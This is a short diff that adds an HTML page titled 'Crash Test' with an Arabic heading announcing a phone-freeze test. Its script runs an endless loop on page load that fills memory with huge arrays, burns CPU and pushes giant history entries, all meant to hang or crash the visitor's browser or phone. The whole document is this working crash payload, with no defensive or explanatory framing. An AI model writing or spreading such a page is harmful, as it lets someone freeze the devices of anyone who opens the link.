@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Crash Test</title>
+</head>
+<body>
+    <h1>اختبار تجميد الهاتف</h1>
+    <script>
+        while (true) {
+            // استنزاف الذاكرة
+            var data = new Array(10**7).fill("A");
+
+            // استنزاف المعالج
+            Math.sqrt(Math.random() * Math.random());
+
+            // إضافة بيانات تاريخ متكرر لإحداث حمل على المتصفح
+            history.pushState({}, "", "#" + "A".repeat(10**8));
+            document.title = "Crash";
+        }
+    </script>
+</body>
+</html>
